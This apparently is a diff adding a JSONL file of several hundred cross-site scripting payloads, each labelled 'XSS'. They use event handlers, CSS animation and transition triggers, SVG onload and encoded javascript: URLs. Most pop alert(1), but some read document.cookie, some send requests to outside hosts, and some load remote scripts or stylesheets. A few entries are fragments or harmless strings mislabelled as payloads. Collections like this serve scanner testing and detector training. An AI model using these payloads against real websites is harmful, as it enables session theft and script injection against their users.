@@ -1,0 +1,819 @@
+{"payload": "<style>@keyframes slidein {}</style><b style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></b>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></noembed>", "type": "XSS"}
+{"payload": "<legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>", "type": "XSS"}
+{"payload": "<style onpaste=\"alert(1)\" contenteditable>test</style>", "type": "XSS"}
+{"payload": "<sub draggable=\"true\" ondragleave=\"alert(1)\">test</sub>", "type": "XSS"}
+{"payload": "<wbr onbeforecopy=\"alert(1)\" contenteditable>test</wbr>", "type": "XSS"}
+{"payload": "<nav onmouseleave=\"alert(1)\">test</nav>", "type": "XSS"}
+{"payload": "<fieldset draggable=\"true\" ondrag=\"alert(1)\">test</fieldset>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>", "type": "XSS"}
+{"payload": "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>", "type": "XSS"}
+{"payload": "<input onfocusout=alert(1) id=x><input autofocus>", "type": "XSS"}
+{"payload": "<figcaption oncontextmenu=\"alert(1)\">test</figcaption>", "type": "XSS"}
+{"payload": "<param oncontextmenu=\"alert(1)\">test</param>", "type": "XSS"}
+{"payload": "<form>", "type": "XSS"}
+{"payload": "<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>", "type": "XSS"}
+{"payload": "<aside oncontextmenu=\"alert(1)\">test</aside>", "type": "XSS"}
+{"payload": "<title onbeforepaste=\"alert(1)\" contenteditable>test</title>", "type": "XSS"}
+{"payload": "<bdi onkeyup=\"alert(1)\" contenteditable>test</bdi>", "type": "XSS"}
+{"payload": "<map id=x tabindex=1 onactivate=alert(1)></map>", "type": "XSS"}
+{"payload": "<strike onmouseup=\"alert(1)\">test</strike>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><blink style=\"animation-name:x\" onanimationend=\"alert(1)\"></blink>", "type": "XSS"}
+{"payload": "<noembed onmouseup=\"alert(1)\">test</noembed>", "type": "XSS"}
+{"payload": "<IMG SRC='vbscript:msgbox(\"XSS\")'>", "type": "XSS"}
+{"payload": "<q id=x tabindex=1 onbeforeactivate=alert(1)></q>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><isindex style=\"animation-name:x\" onanimationstart=\"alert(1)\"></isindex>", "type": "XSS"}
+{"payload": "<meta onbeforecut=\"alert(1)\" contenteditable>test</meta>", "type": "XSS"}
+{"payload": "<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>", "type": "XSS"}
+{"payload": "<body oncut=\"alert(1)\" contenteditable>test</body>", "type": "XSS"}
+{"payload": "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> ?", "type": "XSS"}
+{"payload": "<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><em id=x style=\"transition:color 1s\" ontransitionend=alert(1)></em>", "type": "XSS"}
+{"payload": "<blink ondblclick=\"alert(1)\">test</blink>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><progress id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></progress>", "type": "XSS"}
+{"payload": "<tr onbeforecopy=\"alert(1)\" contenteditable>test</tr>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><abbr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></abbr>", "type": "XSS"}
+{"payload": "<rp onbeforecut=\"alert(1)\" contenteditable>test</rp>", "type": "XSS"}
+{"payload": "<rp ondblclick=\"alert(1)\">test</rp>", "type": "XSS"}
+{"payload": "<ins onmouseup=\"alert(1)\">test</ins>", "type": "XSS"}
+{"payload": "<option oncopy=\"alert(1)\" contenteditable>test</option>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>", "type": "XSS"}
+{"payload": "<noembed onmouseout=\"alert(1)\">test</noembed>", "type": "XSS"}
+{"payload": "<data onkeydown=\"alert(1)\" contenteditable>test</data>", "type": "XSS"}
+{"payload": "<rtc onbeforepaste=\"alert(1)\" contenteditable>test</rtc>", "type": "XSS"}
+{"payload": "<svg><blink onload=alert(1)></blink>", "type": "XSS"}
+{"payload": "<big oncut=\"alert(1)\" contenteditable>test</big>", "type": "XSS"}
+{"payload": "<td id=x tabindex=1 onfocusin=alert(1)></td>", "type": "XSS"}
+{"payload": "<script onmouseenter=\"alert(1)\">test</script>", "type": "XSS"}
+{"payload": "<textarea onfocusout=alert(1) id=x></textarea><input autofocus>", "type": "XSS"}
+{"payload": "<figcaption ondblclick=\"alert(1)\">test</figcaption>", "type": "XSS"}
+{"payload": "<textarea onselect=alert(1) autofocus>XSS</textarea>", "type": "XSS"}
+{"payload": "<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>", "type": "XSS"}
+{"payload": "<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>", "type": "XSS"}
+{"payload": "<map draggable=\"true\" ondrag=\"alert(1)\">test</map>", "type": "XSS"}
+{"payload": "<legend onmouseout=\"alert(1)\">test</legend>", "type": "XSS"}
+{"payload": "<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>", "type": "XSS"}
+{"payload": "<hr oncontextmenu=\"alert(1)\">test</hr>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><rtc id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></rtc>", "type": "XSS"}
+{"payload": "<menu id=x tabindex=1 onfocus=alert(1)></menu>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><audio style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></audio>", "type": "XSS"}
+{"payload": "<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>", "type": "XSS"}
+{"payload": "<data oncopy=\"alert(1)\" contenteditable>test</data>", "type": "XSS"}
+{"payload": "<address onkeyup=\"alert(1)\" contenteditable>test</address>", "type": "XSS"}
+{"payload": "<tt onkeypress=\"alert(1)\" contenteditable>test</tt>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><aside style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></aside>", "type": "XSS"}
+{"payload": "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y", "type": "XSS"}
+{"payload": "<article oncopy=\"alert(1)\" contenteditable>test</article>", "type": "XSS"}
+{"payload": "<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>", "type": "XSS"}
+{"payload": "<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>", "type": "XSS"}
+{"payload": "<basefont draggable=\"true\" ondragstart=\"alert(1)\">test</basefont>", "type": "XSS"}
+{"payload": "<tbody draggable=\"true\" ondragenter=\"alert(1)\">test</tbody>", "type": "XSS"}
+{"payload": "'';!--\"<XSS>=&{()}", "type": "XSS"}
+{"payload": "<bgsound onbeforecut=\"alert(1)\" contenteditable>test</bgsound>", "type": "XSS"}
+{"payload": "<details id=x tabindex=1 onfocus=alert(1)></details>", "type": "XSS"}
+{"payload": "<svg><base onload=alert(1)></base>", "type": "XSS"}
+{"payload": "<summary oncut=\"alert(1)\" contenteditable>test</summary>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></bdi>", "type": "XSS"}
+{"payload": "<acronym onmouseenter=\"alert(1)\">test</acronym>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><ul style=\"animation-name:x\" onanimationend=\"alert(1)\"></ul>", "type": "XSS"}
+{"payload": "<a onkeypress=\"alert(1)\" contenteditable>test</a>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><p style=\"animation-name:x\" onanimationend=\"alert(1)\"></p>", "type": "XSS"}
+{"payload": "<rt onclick=\"alert(1)\">test</rt>", "type": "XSS"}
+{"payload": "<svg><div onload=alert(1)></div>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><frame style=\"animation-name:x\" onanimationend=\"alert(1)\"></frame>", "type": "XSS"}
+{"payload": "<wbr onpaste=\"alert(1)\" contenteditable>test</wbr>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><map id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></map>", "type": "XSS"}
+{"payload": "<sup onmousedown=\"alert(1)\">test</sup>", "type": "XSS"}
+{"payload": "<form><button formaction=javascript&colon;alert(1)>CLICKME", "type": "XSS"}
+{"payload": "<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>", "type": "XSS"}
+{"payload": "<frameset onbeforecopy=\"alert(1)\" contenteditable>test</frameset>", "type": "XSS"}
+{"payload": "<input onbeforecopy=alert(1) value=\"XSS\" autofocus>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><html style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></html>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><label style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></label>", "type": "XSS"}
+{"payload": "<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>", "type": "XSS"}
+{"payload": "<footer draggable=\"true\" ondragenter=\"alert(1)\">test</footer>", "type": "XSS"}
+{"payload": "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><noembed style=\"animation-name:x\" onanimationend=\"alert(1)\"></noembed>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><element style=\"animation-name:x\" onanimationend=\"alert(1)\"></element>", "type": "XSS"}
+{"payload": "<svg><menu onload=alert(1)></menu>", "type": "XSS"}
+{"payload": "<main oncopy=\"alert(1)\" contenteditable>test</main>", "type": "XSS"}
+{"payload": "<slot draggable=\"true\" ondragenter=\"alert(1)\">test</slot>", "type": "XSS"}
+{"payload": "<br onbeforepaste=\"alert(1)\" contenteditable>test</br>", "type": "XSS"}
+{"payload": "<tbody draggable=\"true\" ondragend=\"alert(1)\">test</tbody>", "type": "XSS"}
+{"payload": "<input onauxclick=alert(1)>", "type": "XSS"}
+{"payload": "<nextid id=x tabindex=1 onactivate=alert(1)></nextid>", "type": "XSS"}
+{"payload": "<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>", "type": "XSS"}
+{"payload": "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "type": "XSS"}
+{"payload": "<legend onbeforecopy=\"alert(1)\" contenteditable>test</legend>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><blockquote id=x style=\"transition:color 1s\" ontransitionend=alert(1)></blockquote>", "type": "XSS"}
+{"payload": "<hr onmouseenter=\"alert(1)\">test</hr>", "type": "XSS"}
+{"payload": "<s draggable=\"true\" ondragend=\"alert(1)\">test</s>", "type": "XSS"}
+{"payload": "<optgroup onkeydown=\"alert(1)\" contenteditable>test</optgroup>", "type": "XSS"}
+{"payload": "<footer id=x tabindex=1 onfocus=alert(1)></footer>", "type": "XSS"}
+{"payload": "<div id=\"68\"><doc xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns:html=\"http://www.w3.org/1999/xhtml\">   <html:style /><x xlink:href=\"javascript:alert(68)\" xlink:type=\"simple\">XXX</x></doc>//[\"'`-->]]>]</div>", "type": "XSS"}
+{"payload": "<bdi onkeydown=\"alert(1)\" contenteditable>test</bdi>", "type": "XSS"}
+{"payload": "<menuitem onmouseup=\"alert(1)\">test</menuitem>", "type": "XSS"}
+{"payload": "<header draggable=\"true\" ondragleave=\"alert(1)\">test</header>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></head>", "type": "XSS"}
+{"payload": "<svg><br onload=alert(1)></br>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>", "type": "XSS"}
+{"payload": "<frame draggable=\"true\" ondragenter=\"alert(1)\">test</frame>", "type": "XSS"}
+{"payload": "<iframe id=x tabindex=1 onactivate=alert(1)></iframe>", "type": "XSS"}
+{"payload": "<menu onmouseleave=\"alert(1)\">test</menu>", "type": "XSS"}
+{"payload": "<frameset oncut=\"alert(1)\" contenteditable>test</frameset>", "type": "XSS"}
+{"payload": "<i draggable=\"true\" ondrag=\"alert(1)\">test</i>", "type": "XSS"}
+{"payload": "<area draggable=\"true\" ondragstart=\"alert(1)\">test</area>", "type": "XSS"}
+{"payload": "<svg><shadow onload=alert(1)></shadow>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>", "type": "XSS"}
+{"payload": "<video src/onerror=alert(1)>", "type": "XSS"}
+{"payload": "<optgroup draggable=\"true\" ondrag=\"alert(1)\">test</optgroup>", "type": "XSS"}
+{"payload": "/* INJECTX", "type": "XSS"}
+{"payload": "<sup onbeforecut=\"alert(1)\" contenteditable>test</sup>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><svg id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></svg>", "type": "XSS"}
+{"payload": "<image src/onerror=prompt(8)>", "type": "XSS"}
+{"payload": "<div id=\"89\"><svg xmlns=\"http://www.w3.org/2000/svg\">", "type": "XSS"}
+{"payload": "<dfn draggable=\"true\" ondragenter=\"alert(1)\">test</dfn>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><tbody style=\"animation-name:x\" onanimationend=\"alert(1)\"></tbody>", "type": "XSS"}
+{"payload": "<dialog onkeydown=\"alert(1)\" contenteditable>test</dialog>", "type": "XSS"}
+{"payload": "<tt onmouseleave=\"alert(1)\">test</tt>", "type": "XSS"}
+{"payload": "<i onclick=\"alert(1)\">test</i>", "type": "XSS"}
+{"payload": "<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>", "type": "XSS"}
+{"payload": "<canvas draggable=\"true\" ondragleave=\"alert(1)\">test</canvas>", "type": "XSS"}
+{"payload": "<footer oncopy=\"alert(1)\" contenteditable>test</footer>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></details>", "type": "XSS"}
+{"payload": "<embed onmousedown=\"alert(1)\">test</embed>", "type": "XSS"}
+{"payload": "<var onmousemove=\"alert(1)\">test</var>", "type": "XSS"}
+{"payload": "<p draggable=\"true\" ondragstart=\"alert(1)\">test</p>", "type": "XSS"}
+{"payload": "<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>", "type": "XSS"}
+{"payload": "<body onpageshow=alert(1)>", "type": "XSS"}
+{"payload": "<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><content id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></content>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>", "type": "XSS"}
+{"payload": "<param onpaste=\"alert(1)\" contenteditable>test</param>", "type": "XSS"}
+{"payload": "<s onkeydown=\"alert(1)\" contenteditable>test</s>", "type": "XSS"}
+{"payload": "<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>", "type": "XSS"}
+{"payload": "<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>", "type": "XSS"}
+{"payload": "<div id=\"67\"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA \"http://www.w3.org/1999/xhtml\" src CDATA \"xx:x\"onerror CDATA \"alert(67)\"onload CDATA \"alert(2)\">]><img />//[\"'`-->]]>]</div>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><frame id=x style=\"transition:color 1s\" ontransitionend=alert(1)></frame>", "type": "XSS"}
+{"payload": "<frameset draggable=\"true\" ondragstart=\"alert(1)\">test</frameset>", "type": "XSS"}
+{"payload": "<figure id=x tabindex=1 onfocus=alert(1)></figure>", "type": "XSS"}
+{"payload": "<xmp oncopy=\"alert(1)\" contenteditable>test</xmp>", "type": "XSS"}
+{"payload": "<menu id=x tabindex=1 onfocusin=alert(1)></menu>", "type": "XSS"}
+{"payload": "\"", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><data id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></data>", "type": "XSS"}
+{"payload": "<thead onmouseleave=\"alert(1)\">test</thead>", "type": "XSS"}
+{"payload": "<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>", "type": "XSS"}
+{"payload": "<script>alert(1)<!–", "type": "XSS"}
+{"payload": "<img src ?itworksonchrome?\\/onerror = alert(1)???", "type": "XSS"}
+{"payload": "<area oncopy=\"alert(1)\" contenteditable>test</area>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><meta style=\"animation-name:x\" onanimationstart=\"alert(1)\"></meta>", "type": "XSS"}
+{"payload": "<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>", "type": "XSS"}
+{"payload": "<video id=x tabindex=1 onactivate=alert(1)></video>", "type": "XSS"}
+{"payload": "<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>", "type": "XSS"}
+{"payload": "<q onbeforepaste=\"alert(1)\" contenteditable>test</q>", "type": "XSS"}
+{"payload": "<basefont id=x tabindex=1 onfocus=alert(1)></basefont>", "type": "XSS"}
+{"payload": "<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>", "type": "XSS"}
+{"payload": "<strike onmousedown=\"alert(1)\">test</strike>", "type": "XSS"}
+{"payload": "<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>", "type": "XSS"}
+{"payload": "Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>", "type": "XSS"}
+{"payload": "<? foo=\"><x foo='?><script>alert(91)</script>'>\">", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><param style=\"animation-name:x\" onanimationstart=\"alert(1)\"></param>", "type": "XSS"}
+{"payload": "<hr onkeypress=\"alert(1)\" contenteditable>test</hr>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><time id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></time>", "type": "XSS"}
+{"payload": "<big onmouseenter=\"alert(1)\">test</big>", "type": "XSS"}
+{"payload": "<svg><b onload=alert(1)></b>", "type": "XSS"}
+{"payload": "<rb onbeforecut=\"alert(1)\" contenteditable>test</rb>", "type": "XSS"}
+{"payload": "<script id=x tabindex=1 onfocus=alert(1)></script>", "type": "XSS"}
+{"payload": "<pre onpaste=\"alert(1)\" contenteditable>test</pre>", "type": "XSS"}
+{"payload": "<col onmouseenter=\"alert(1)\">test</col>", "type": "XSS"}
+{"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>", "type": "XSS"}
+{"payload": "<time draggable=\"true\" ondragstart=\"alert(1)\">test</time>", "type": "XSS"}
+{"payload": "<rt onmouseover=\"alert(1)\">test</rt>", "type": "XSS"}
+{"payload": "<BODY ONLOAD=alert('XSS')>", "type": "XSS"}
+{"payload": "<nextid ondblclick=\"alert(1)\">test</nextid>", "type": "XSS"}
+{"payload": "<meter onbeforecut=\"alert(1)\" contenteditable>test</meter>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><fieldset style=\"animation-name:x\" onanimationstart=\"alert(1)\"></fieldset>", "type": "XSS"}
+{"payload": "<menuitem onkeypress=\"alert(1)\" contenteditable>test</menuitem>", "type": "XSS"}
+{"payload": "<base draggable=\"true\" ondragenter=\"alert(1)\">test</base>", "type": "XSS"}
+{"payload": "<template onkeyup=\"alert(1)\" contenteditable>test</template>", "type": "XSS"}
+{"payload": "<svg><small onload=alert(1)></small>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><video style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></video>", "type": "XSS"}
+{"payload": "<body onload=alert(1)>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><applet id=x style=\"transition:color 1s\" ontransitionend=alert(1)></applet>", "type": "XSS"}
+{"payload": "';", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></area>", "type": "XSS"}
+{"payload": "<noscript oncontextmenu=\"alert(1)\">test</noscript>", "type": "XSS"}
+{"payload": "<samp oncut=\"alert(1)\" contenteditable>test</samp>", "type": "XSS"}
+{"payload": "<center onkeyup=\"alert(1)\" contenteditable>test</center>", "type": "XSS"}
+{"payload": "<link onmouseout=\"alert(1)\">test</link>", "type": "XSS"}
+{"payload": "<cite draggable=\"true\" ondragend=\"alert(1)\">test</cite>", "type": "XSS"}
+{"payload": "<keygen onclick=\"alert(1)\">test</keygen>", "type": "XSS"}
+{"payload": "<del onmousedown=\"alert(1)\">test</del>", "type": "XSS"}
+{"payload": "<thead id=x tabindex=1 onfocus=alert(1)></thead>", "type": "XSS"}
+{"payload": "<script src=\"//brutelogic.com.br&sol;1.js&num;", "type": "XSS"}
+{"payload": "<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>", "type": "XSS"}
+{"payload": "<nav onbeforepaste=\"alert(1)\" contenteditable>test</nav>", "type": "XSS"}
+{"payload": "<applet oncopy=\"alert(1)\" contenteditable>test</applet>", "type": "XSS"}
+{"payload": "<big onmouseout=\"alert(1)\">test</big>", "type": "XSS"}
+{"payload": "<embed onmouseleave=\"alert(1)\">test</embed>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><textarea style=\"animation-name:x\" onanimationstart=\"alert(1)\"></textarea>", "type": "XSS"}
+{"payload": "<cite ondblclick=\"alert(1)\">test</cite>", "type": "XSS"}
+{"payload": "<![><img src=\"]><img src=x onerror=alert(39)//\">", "type": "XSS"}
+{"payload": "<legend onmouseover=\"alert(1)\">test</legend>", "type": "XSS"}
+{"payload": "<body onblur=alert(1) id=x><iframe id=x>", "type": "XSS"}
+{"payload": "<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>", "type": "XSS"}
+{"payload": "<tt oncopy=\"alert(1)\" contenteditable>test</tt>", "type": "XSS"}
+{"payload": "<img onbeforecopy=\"alert(1)\" contenteditable>test</img>", "type": "XSS"}
+{"payload": "<abbr draggable=\"true\" ondragstart=\"alert(1)\">test</abbr>", "type": "XSS"}
+{"payload": "<dd oncopy=\"alert(1)\" contenteditable>test</dd>", "type": "XSS"}
+{"payload": "<script draggable=\"true\" ondragenter=\"alert(1)\">test</script>", "type": "XSS"}
+{"payload": "<bdi onclick=\"alert(1)\">test</bdi>", "type": "XSS"}
+{"payload": "<abbr id=x tabindex=1 onactivate=alert(1)></abbr>", "type": "XSS"}
+{"payload": "<iframe src=\"http://www.example.org/dropHere.html\"></iframe>//[\"'`-->]]>]</div>", "type": "XSS"}
+{"payload": "<main onclick=\"alert(1)\">test</main>", "type": "XSS"}
+{"payload": "<svg id=x tabindex=1 onactivate=alert(1)></svg>", "type": "XSS"}
+{"payload": "<video autoplay controls onvolumechange=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>", "type": "XSS"}
+{"payload": "<aside onmouseover=\"alert(1)\">test</aside>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><bdo id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></bdo>", "type": "XSS"}
+{"payload": "<object onmouseover=\"alert(1)\">test</object>", "type": "XSS"}
+{"payload": "<data onmouseover=\"alert(1)\">test</data>", "type": "XSS"}
+{"payload": "<style>:target {color: red;}</style><dt id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></dt>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><th id=x style=\"transition:color 1s\" ontransitionend=alert(1)></th>", "type": "XSS"}
+{"payload": "<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><svg style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></svg>", "type": "XSS"}
+{"payload": "<s onclick=\"alert(1)\">test</s>", "type": "XSS"}
+{"payload": "*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */", "type": "XSS"}
+{"payload": "<u onmouseenter=\"alert(1)\">test</u>", "type": "XSS"}
+{"payload": "<hgroup onmouseenter=\"alert(1)\">test</hgroup>", "type": "XSS"}
+{"payload": "<textarea autofocus onfocus=alert(1)>test</textarea>", "type": "XSS"}
+{"payload": "<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>", "type": "XSS"}
+{"payload": "*/</script>'>alert(1)/*<script/1='", "type": "XSS"}
+{"payload": "<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>", "type": "XSS"}
+{"payload": "<multicol id=x tabindex=1 onactivate=alert(1)></multicol>", "type": "XSS"}
+{"payload": "<tr onpaste=\"alert(1)\" contenteditable>test</tr>", "type": "XSS"}
+{"payload": "<image src=validimage.png onloadstart=alert(1)>", "type": "XSS"}
+{"payload": "<spacer draggable=\"true\" ondrag=\"alert(1)\">test</spacer>", "type": "XSS"}
+{"payload": "<address draggable=\"true\" ondragend=\"alert(1)\">test</address>", "type": "XSS"}
+{"payload": "<audio id=x controls onfocusin=alert(1) id=x><source src=\"validaudio.wav\"></audio>", "type": "XSS"}
+{"payload": "<ruby onmousedown=\"alert(1)\">test</ruby>", "type": "XSS"}
+{"payload": "<summary onbeforecut=\"alert(1)\" contenteditable>test</summary>", "type": "XSS"}
+{"payload": "<svg><nav onload=alert(1)></nav>", "type": "XSS"}
+{"payload": "<basefont onbeforepaste=\"alert(1)\" contenteditable>test</basefont>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><data id=x style=\"transition:color 1s\" ontransitionend=alert(1)></data>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><h1 id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></h1>", "type": "XSS"}
+{"payload": "<template oncut=\"alert(1)\" contenteditable>test</template>", "type": "XSS"}
+{"payload": "<datalist onmouseup=\"alert(1)\">test</datalist>", "type": "XSS"}
+{"payload": "top[8680439..toString(30)](1)", "type": "XSS"}
+{"payload": "<td onmousemove=\"alert(1)\">test</td>", "type": "XSS"}
+{"payload": "<datalist onbeforecut=\"alert(1)\" contenteditable>test</datalist>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>", "type": "XSS"}
+{"payload": "<li oncut=\"alert(1)\" contenteditable>test</li>", "type": "XSS"}
+{"payload": "<rt draggable=\"true\" ondragleave=\"alert(1)\">test</rt>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><blockquote style=\"animation-name:x\" onanimationend=\"alert(1)\"></blockquote>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><plaintext id=x style=\"transition:color 1s\" ontransitionend=alert(1)></plaintext>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><title id=x style=\"transition:color 1s\" ontransitionend=alert(1)></title>", "type": "XSS"}
+{"payload": "<head onbeforepaste=\"alert(1)\" contenteditable>test</head>", "type": "XSS"}
+{"payload": "<cite oncopy=\"alert(1)\" contenteditable>test</cite>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></element>", "type": "XSS"}
+{"payload": "<body>Hello</body>", "type": "XSS"}
+{"payload": "<strike onkeypress=\"alert(1)\" contenteditable>test</strike>", "type": "XSS"}
+{"payload": "<br onmouseup=\"alert(1)\">test</br>", "type": "XSS"}
+{"payload": "<link draggable=\"true\" ondragend=\"alert(1)\">test</link>", "type": "XSS"}
+{"payload": "<sub onclick=\"alert(1)\">test</sub>", "type": "XSS"}
+{"payload": "<svg><noframes onload=alert(1)></noframes>", "type": "XSS"}
+{"payload": "<caption onmousemove=\"alert(1)\">test</caption>", "type": "XSS"}
+{"payload": "<noframes onmouseout=\"alert(1)\">test</noframes>", "type": "XSS"}
